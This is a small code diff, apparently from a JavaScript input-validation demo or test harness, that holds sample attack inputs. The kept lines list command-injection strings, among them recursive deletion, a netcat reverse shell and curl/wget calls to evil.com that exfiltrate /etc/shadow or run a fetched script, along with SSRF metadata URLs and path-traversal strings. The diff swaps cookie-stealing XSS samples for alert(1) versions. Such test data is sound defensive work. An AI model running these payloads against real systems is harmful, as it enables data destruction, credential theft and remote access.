@@ -251,7 +251,7 @@
                 command_injection: ['test.txt; rm -rf /home/*', 'ls && cat /etc/passwd', 'ping localhost | nc evil.com 4444 -e /bin/sh', 'file.pdf; wget http://evil.com/mal.sh | bash', '; curl http://evil.com?data=$(cat /etc/shadow)', '`id; whoami; cat /etc/hosts`', '|| powershell -enc [payload]', "$(echo 'backdoor' > /tmp/shell.sh)"],
                 url_ssrf: ['http://169.254.169.254/latest/meta-data/', 'http://localhost:8080/admin/delete-all', 'file:///etc/passwd', 'http://internal-api.corp:3000/secrets', 'http://127.0.0.1:6379/FLUSHALL', 'http://metadata.google.internal/v1/', 'http://[::]:22/', 'http://evil.com/phishing?steal=creds'],
                 path_traversal: ['../../../etc/passwd', '....//....//windows/system32/config/sam', '..%2f..%2f..%2fetc%2fshadow', '/var/www/../../../root/.ssh/id_rsa', '..\\..\\..\\windows\\system.ini', 'images/../../../app/config/db.yml', '%2e%2e%2f%2e%2e%2fproc/self/environ', '..././..././etc/hosts'],
-                xss_links: ['[script]steal(document.cookie)[/script]', '[img src=x onerror=alert(1)]', '[svg onload=fetch(evil+cookie)]', 'javascript:eval(atob(payload))', '[a href=javascript:alert(XSS)]Click[/a]', '[img onerror=new Image().src=evil+cookie]', '[iframe src=javascript:postMessage]', '[div style=background:url(javascript:)]'],
+                xss_links: ['[script]alert(1)[/script]', '[img src=x onerror=alert(1)]', '[svg onload=alert(1)]', 'javascript:alert(1)', '[a href=javascript:alert(XSS)]Click[/a]', '[img onerror=alert(1)]', '[iframe src=javascript:alert(1)]', '[div onmouseover=alert(1)]'],
             };
 
             const resetPipeline = () => {
